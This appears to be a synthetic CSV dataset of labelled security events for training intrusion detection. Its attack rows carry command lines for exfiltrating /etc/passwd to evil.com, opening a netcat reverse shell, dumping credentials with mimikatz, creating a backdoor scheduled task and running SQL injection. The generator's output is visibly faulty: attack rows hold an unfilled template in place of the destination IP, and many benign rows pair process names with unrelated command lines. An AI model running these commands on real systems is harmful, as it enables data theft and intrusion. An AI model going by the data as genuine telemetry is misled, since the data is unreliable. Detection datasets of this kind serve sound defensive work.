@timestamp,label,attack_name,mitre_technique,mitre_tactic,event.category,event.outcome,source.ip,source.port,destination.ip,destination.port,network.bytes,network.packets,agent.hostname,agent.type,user.name,process.pid,process.name,process.command_line,file_name,domain
2026-09-10T15:35:23.544999,attack,credential_dump,T1003,credential_access,process,success,192.168.56.6,0,"10.0.0.{random.randint(1, 254)}",0,9137,3,workstation1,windows,administrator,3160,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-13T01:49:04.564702,benign,,,,file,success,192.168.1.32,4096,10.0.0.32,22,9196,92,mail3,linux,mark.wilson,6309,apache2,explorer.exe,,
2026-09-14T20:47:23.563571,benign,,,,process,success,192.168.1.38,3072,10.0.2.91,53,3773,60,backup10,linux,chris.miller,5036,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-13T14:51:22.569138,benign,,,,network,success,192.168.1.229,4096,10.0.4.107,80,9649,15,mail4,windows,sarah.jones,6633,nginx,chrome.exe --profile-directory=Default,,
2026-09-11T14:56:45.559574,benign,,,,network,success,192.168.1.114,2048,10.0.0.125,80,4176,28,backup2,windows,mike.brown,9763,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T04:18:07.556454,benign,,,,process,success,192.168.1.55,4096,10.0.1.202,53,4722,60,backup2,linux,mark.wilson,2909,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-15T10:42:56.569015,benign,,,,authentication,success,192.168.1.206,2048,10.0.5.173,22,8382,43,mail10,windows,emily.davis,3254,systemd,apache2 -DFOREGROUND,,
2026-09-13T00:16:29.569098,benign,,,,network,success,192.168.1.251,2048,10.0.0.103,80,7510,58,backup10,linux,mark.wilson,2930,nginx,explorer.exe,,
2026-09-12T07:17:45.555113,benign,,,,authentication,success,192.168.1.143,4096,10.0.1.152,53,869,24,web50,windows,mike.brown,308,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T09:44:20.557606,benign,,,,process,success,192.168.1.211,1024,10.0.2.24,80,9008,17,workstation1,linux,john.doe,4986,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-09T01:26:23.546640,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.10,33866,"10.0.0.{random.randint(1, 254)}",443,52952,58,app4,windows,guest,1613,powershell.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-09T16:07:24.559046,benign,,,,network,success,192.168.1.221,1024,10.0.0.148,3306,4863,78,backup5,linux,john.doe,3697,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T02:05:03.546411,attack,persistence,T1053,persistence,process,success,192.168.56.9,0,"10.0.0.{random.randint(1, 254)}",0,260,7,app10,linux,admin,7318,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-12T09:44:29.541189,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.1,40134,"10.0.0.{random.randint(1, 254)}",445,19757,375,backup100,windows,test,6642,psexec.exe,,,
2026-09-11T15:21:56.549715,benign,,,,network,success,192.168.1.68,8443,10.0.0.110,80,5836,66,web5,linux,sarah.jones,3868,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T20:38:56.555916,benign,,,,network,success,192.168.1.236,8443,10.0.4.33,3306,6818,17,web4,linux,lisa.wilson,7492,apache2,chrome.exe --profile-directory=Default,,
2026-09-11T09:06:04.554670,benign,,,,network,success,192.168.1.208,8443,10.0.2.245,22,237,53,srv4,windows,mark.wilson,4526,apache2,chrome.exe --profile-directory=Default,,
2026-09-09T16:54:55.567672,benign,,,,network,success,192.168.1.76,2048,10.0.2.47,80,1190,40,db10,windows,admin,9896,nginx,firefox.exe,,
2026-09-08T22:08:55.566827,benign,,,,authentication,success,192.168.1.183,5000,10.0.1.59,3306,4270,64,db50,linux,mark.wilson,2618,nginx,firefox.exe,,
2026-09-10T23:54:42.564215,benign,,,,network,success,192.168.1.236,3072,10.0.1.212,22,8068,36,mail100,linux,david.moore,9179,explorer.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-15T01:13:20.540398,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.8,9311,"10.0.0.{random.randint(1, 254)}",22,1700,6,workstation100,linux,administrator,2569,bash,,,
2026-09-12T13:32:03.556293,benign,,,,network,success,192.168.1.17,1024,10.0.1.239,3306,2196,45,web10,linux,david.moore,9130,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T22:21:59.560653,benign,,,,network,success,192.168.1.20,5000,10.0.3.48,443,4217,82,mail4,linux,mark.wilson,544,sshd,sshd: /usr/sbin/sshd [listener],,
2026-09-15T05:36:35.553446,benign,,,,authentication,success,192.168.1.110,8443,10.0.5.171,22,2207,15,backup100,linux,david.moore,886,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-10T18:42:05.562978,benign,,,,network,success,192.168.1.250,5000,10.0.3.15,53,270,73,backup5,linux,emily.davis,3831,explorer.exe,explorer.exe,,
2026-09-11T07:58:53.569718,benign,,,,file,success,192.168.1.57,4096,10.0.2.168,3306,1477,51,app10,windows,john.doe,4480,nginx,sshd: /usr/sbin/sshd [listener],,
2026-09-10T23:53:29.551404,benign,,,,file,success,192.168.1.225,3072,10.0.0.66,53,8355,31,backup100,linux,emily.davis,6768,chrome.exe,firefox.exe,,
2026-09-10T19:34:44.540739,attack,reverse_shell,T1059,execution,process,success,192.168.56.4,23984,"10.0.0.{random.randint(1, 254)}",4444,3518,13,workstation4,windows,guest,2442,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-14T19:55:22.541506,attack,lateral_movement,T1021,lateral_movement,network,success,192.168.56.9,18294,"10.0.0.{random.randint(1, 254)}",445,41202,381,db1,linux,test,3025,psexec.exe,,,
2026-09-11T08:01:21.541885,attack,webshell,T1505,persistence,file,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,131,4,db3,windows,guest,9307,php,php /var/www/html/shell.php,shell.php,
2026-09-13T07:33:31.545875,attack,reverse_shell,T1059,execution,process,success,192.168.56.7,61735,"10.0.0.{random.randint(1, 254)}",4444,577,22,web100,windows,administrator,6590,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-14T05:38:25.552831,benign,,,,authentication,success,192.168.1.152,4096,10.0.1.250,53,1247,82,srv5,windows,jane.smith,2442,sshd,chrome.exe --profile-directory=Default,,
2026-09-15T00:39:49.544194,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.2,30055,"10.0.0.{random.randint(1, 254)}",443,8249,86,backup50,windows,test,2640,bash,,,evil-c2.com
2026-09-10T00:40:48.557322,benign,,,,process,success,192.168.1.240,2048,10.0.3.81,53,4997,16,mail1,windows,john.doe,1610,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-10T12:16:24.555603,benign,,,,network,success,192.168.1.152,3072,10.0.2.208,3306,5097,57,db3,linux,john.doe,1798,sshd,apache2 -DFOREGROUND,,
2026-09-10T06:12:55.563441,benign,,,,authentication,success,192.168.1.122,3072,10.0.3.193,80,2804,29,srv10,linux,jane.smith,5315,explorer.exe,apache2 -DFOREGROUND,,
2026-09-13T13:17:52.560538,benign,,,,process,success,192.168.1.235,1024,10.0.5.170,443,2810,79,backup2,linux,chris.miller,9238,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-10T07:36:40.559697,benign,,,,network,success,192.168.1.244,2048,10.0.5.27,3306,892,47,mail20,linux,david.moore,9685,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-12T19:23:20.566382,benign,,,,network,success,192.168.1.63,3072,10.0.3.76,80,604,86,srv20,linux,mike.brown,548,nginx,apache2 -DFOREGROUND,,
2026-09-12T01:25:52.549362,benign,,,,network,success,192.168.1.20,5000,10.0.2.187,80,5739,53,app2,linux,mark.wilson,3897,chrome.exe,chrome.exe --profile-directory=Default,,
2026-09-09T07:27:02.558714,benign,,,,network,success,192.168.1.117,3072,10.0.5.249,53,2340,29,workstation4,windows,mike.brown,8862,sshd,apache2 -DFOREGROUND,,
2026-09-10T00:47:09.548120,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.7,39366,"10.0.0.{random.randint(1, 254)}",22,1728,4,web20,linux,guest,7898,powershell.exe,,,
2026-09-10T23:29:30.544551,attack,reverse_shell,T1059,execution,process,success,192.168.56.10,2641,"10.0.0.{random.randint(1, 254)}",4444,2604,3,srv20,linux,test,1445,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-13T13:57:08.543901,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.7,22559,"10.0.0.{random.randint(1, 254)}",8080,33228,405,mail5,windows,guest,4338,cmd.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-15T06:23:06.570200,benign,,,,process,success,192.168.1.15,3072,10.0.5.181,53,9563,24,app50,windows,lisa.wilson,3713,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T00:58:19.564139,benign,,,,file,success,192.168.1.189,2048,10.0.5.6,3306,1230,67,srv10,linux,sarah.jones,7823,systemd,firefox.exe,,
2026-09-14T07:37:18.566197,benign,,,,authentication,success,192.168.1.42,8443,10.0.0.253,443,2790,64,workstation3,linux,admin,1295,systemd,apache2 -DFOREGROUND,,
2026-09-10T11:52:46.542895,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,29376,"10.0.0.{random.randint(1, 254)}",443,3897,26,mail1,windows,test,1108,python3,,,evil-c2.com
2026-09-11T18:28:18.541130,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.10,61928,"10.0.0.{random.randint(1, 254)}",443,54347,443,srv4,windows,administrator,1374,python3,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-13T12:13:20.547461,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.10,8255,"10.0.0.{random.randint(1, 254)}",443,73506,364,workstation20,windows,administrator,8710,powershell.exe,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-11T23:42:06.543053,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.7,43051,"10.0.0.{random.randint(1, 254)}",8080,51364,194,db4,windows,test,9918,bash,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-13T03:47:11.569844,benign,,,,authentication,success,192.168.1.58,8443,10.0.1.111,53,4964,29,web2,linux,emily.davis,8060,firefox.exe,apache2 -DFOREGROUND,,
2026-09-12T02:02:21.558180,benign,,,,network,success,192.168.1.186,2048,10.0.4.3,22,9319,40,web2,linux,admin,2688,nginx,firefox.exe,,
2026-09-14T05:24:26.561393,benign,,,,authentication,success,192.168.1.221,3072,10.0.1.251,80,8470,74,db5,windows,jane.smith,8604,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-13T07:35:52.542342,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.1,3631,"10.0.0.{random.randint(1, 254)}",22,1703,20,srv50,linux,root,6829,powershell.exe,,,
2026-09-14T20:26:28.540713,attack,sql_injection,T1190,initial_access,web,success,192.168.56.6,36526,"10.0.0.{random.randint(1, 254)}",80,4639,8,app50,linux,administrator,9622,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-12T11:25:56.548959,benign,,,,network,success,192.168.1.158,8443,10.0.4.118,443,7373,66,db3,windows,mike.brown,7063,chrome.exe,explorer.exe,,
2026-09-09T03:31:01.549709,benign,,,,process,success,192.168.1.91,5000,10.0.5.254,22,8014,14,db1,linux,david.moore,7692,nginx,explorer.exe,,
2026-09-14T15:17:31.552787,benign,,,,process,success,192.168.1.249,4096,10.0.5.75,22,4474,24,app5,windows,mark.wilson,2244,chrome.exe,apache2 -DFOREGROUND,,
2026-09-12T21:38:53.567939,benign,,,,network,success,192.168.1.243,5000,10.0.1.184,22,6561,65,web2,linux,john.doe,9938,explorer.exe,chrome.exe --profile-directory=Default,,
2026-09-13T03:56:18.542879,attack,c2_beacon,T1071,command_and_control,network,success,192.168.56.3,33598,"10.0.0.{random.randint(1, 254)}",443,3528,50,mail4,linux,administrator,1593,powershell.exe,,,evil-c2.com
2026-09-09T15:42:04.541619,attack,sql_injection,T1190,initial_access,web,success,192.168.56.5,24670,"10.0.0.{random.randint(1, 254)}",80,2356,45,srv20,windows,guest,3455,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-14T00:45:15.545494,attack,webshell,T1505,persistence,file,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,1108,6,mail2,linux,administrator,6451,php,php /var/www/html/shell.php,shell.php,
2026-09-10T09:58:06.547677,attack,webshell,T1505,persistence,file,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,5318,8,db1,windows,test,8755,php,php /var/www/html/shell.php,shell.php,
2026-09-15T04:18:03.568462,benign,,,,network,success,192.168.1.198,1024,10.0.5.239,443,3224,34,backup100,windows,emily.davis,1478,nginx,apache2 -DFOREGROUND,,
2026-09-10T18:59:19.547693,attack,sql_injection,T1190,initial_access,web,success,192.168.56.8,11031,"10.0.0.{random.randint(1, 254)}",80,748,29,db5,linux,administrator,5919,cmd.exe,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-12T03:29:49.548084,attack,sql_injection,T1190,initial_access,web,success,192.168.56.10,57507,"10.0.0.{random.randint(1, 254)}",80,3285,50,web4,windows,test,4425,bash,SELECT * FROM users WHERE username = 'admin' OR '1'='1',,
2026-09-14T01:17:15.546343,attack,ssh_brute_force,T1110,credential_access,authentication,failure,192.168.56.1,17904,"10.0.0.{random.randint(1, 254)}",22,1857,3,web5,windows,test,7490,python3,,,
2026-09-14T06:26:16.566539,benign,,,,process,success,192.168.1.83,5000,10.0.4.147,53,6590,22,mail2,windows,mark.wilson,4940,nginx,apache2 -DFOREGROUND,,
2026-09-12T03:06:26.544418,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,17432,"10.0.0.{random.randint(1, 254)}",4444,235,8,mail2,linux,test,6898,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-12T19:29:03.554331,benign,,,,authentication,success,192.168.1.245,8443,10.0.0.137,3306,2525,63,db50,linux,john.doe,4082,sshd,firefox.exe,,
2026-09-10T18:26:37.562413,benign,,,,network,success,192.168.1.55,8443,10.0.2.169,443,3430,77,mail20,windows,chris.miller,6054,explorer.exe,explorer.exe,,
2026-09-10T00:57:46.552734,benign,,,,authentication,success,192.168.1.135,3072,10.0.3.159,3306,5327,12,backup3,windows,emily.davis,6698,apache2,chrome.exe --profile-directory=Default,,
2026-09-14T08:39:22.552554,benign,,,,authentication,success,192.168.1.226,5000,10.0.4.6,80,1226,48,backup5,linux,jane.smith,3359,firefox.exe,chrome.exe --profile-directory=Default,,
2026-09-13T12:31:39.541577,attack,credential_dump,T1003,credential_access,process,success,192.168.56.1,0,"10.0.0.{random.randint(1, 254)}",0,4158,3,db5,windows,root,6323,mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,,
2026-09-13T19:18:48.554500,benign,,,,authentication,success,192.168.1.83,8443,10.0.0.150,22,5118,8,srv100,linux,sarah.jones,4576,chrome.exe,explorer.exe,,
2026-09-12T01:55:16.547866,attack,persistence,T1053,persistence,process,success,192.168.56.8,0,"10.0.0.{random.randint(1, 254)}",0,802,6,web10,windows,test,2042,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-09T09:54:02.546171,attack,persistence,T1053,persistence,process,success,192.168.56.4,0,"10.0.0.{random.randint(1, 254)}",0,848,4,srv4,windows,test,5605,schtasks,schtasks /create /tn Backdoor /tr calc.exe /sc onlogon,,
2026-09-12T02:42:26.570319,benign,,,,file,success,192.168.1.10,8443,10.0.1.252,80,9461,6,mail10,linux,david.moore,8903,explorer.exe,firefox.exe,,
2026-09-15T09:18:40.541356,attack,data_exfiltration,T1048,exfiltration,network,success,192.168.56.1,47785,"10.0.0.{random.randint(1, 254)}",443,13944,111,db5,windows,admin,6557,bash,curl -d @/etc/passwd http://evil.com/exfil,,
2026-09-08T22:23:31.554041,benign,,,,file,success,192.168.1.243,3072,10.0.3.173,22,1210,84,mail4,windows,emily.davis,8035,firefox.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-11T15:45:00.569904,benign,,,,network,success,192.168.1.190,3072,10.0.4.85,80,6572,72,web50,windows,sarah.jones,6258,chrome.exe,firefox.exe,,
2026-09-09T23:25:53.553522,benign,,,,network,success,192.168.1.187,1024,10.0.4.207,22,1905,60,srv10,windows,sarah.jones,9909,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-10T05:55:32.570044,benign,,,,network,success,192.168.1.224,5000,10.0.0.20,80,5986,17,backup10,windows,lisa.wilson,7095,chrome.exe,firefox.exe,,
2026-09-10T05:29:51.557438,benign,,,,network,success,192.168.1.113,5000,10.0.5.89,22,552,93,backup2,linux,emily.davis,5992,sshd,chrome.exe --profile-directory=Default,,
2026-09-12T06:44:04.559492,benign,,,,process,success,192.168.1.182,4096,10.0.2.178,3306,7409,81,web1,linux,admin,9004,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-15T07:55:13.566821,benign,,,,network,success,192.168.1.182,1024,10.0.5.162,80,7904,2,mail2,linux,david.moore,878,chrome.exe,sshd: /usr/sbin/sshd [listener],,
2026-09-14T09:43:06.559223,benign,,,,network,success,192.168.1.149,8443,10.0.1.91,443,5448,90,workstation1,linux,chris.miller,2400,apache2,explorer.exe,,
2026-09-12T22:08:34.551802,benign,,,,process,success,192.168.1.35,8443,10.0.1.148,53,6816,60,srv5,windows,chris.miller,1390,systemd,sshd: /usr/sbin/sshd [listener],,
2026-09-09T13:31:11.547892,attack,reverse_shell,T1059,execution,process,success,192.168.56.9,42324,"10.0.0.{random.randint(1, 254)}",4444,4708,26,app5,linux,test,9066,nc,nc -e /bin/bash 192.168.56.10 4444,,
2026-09-14T20:29:55.565075,benign,,,,network,success,192.168.1.183,1024,10.0.2.53,80,7379,10,backup1,windows,david.moore,5487,sshd,firefox.exe,,
2026-09-10T07:11:54.565642,benign,,,,network,success,192.168.1.78,5000,10.0.3.230,22,3826,67,mail20,windows,sarah.jones,4020,chrome.exe,firefox.exe,,
2026-09-15T06:20:17.567975,benign,,,,authentication,success,192.168.1.97,8443,10.0.0.113,80,9541,60,backup4,linux,sarah.jones,1421,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-11T21:22:55.562028,benign,,,,authentication,success,192.168.1.194,4096,10.0.0.197,80,7423,17,workstation10,linux,admin,6192,apache2,sshd: /usr/sbin/sshd [listener],,
2026-09-14T07:39:34.545670,attack,webshell,T1505,persistence,file,success,192.168.56.10,0,"10.0.0.{random.randint(1, 254)}",0,9265,2,backup5,linux,admin,2310,php,php /var/www/html/shell.php,shell.php,
2026-09-14T03:29:33.541251,attack,reverse_shell,T1059,execution,process,success,192.168.56.7,46522,"10.0.0.{random.randint(1, 254)}",4444,1993,11,web2,linux,guest,7684,nc,nc -e /bin/bash 192.168.56.10 4444,,
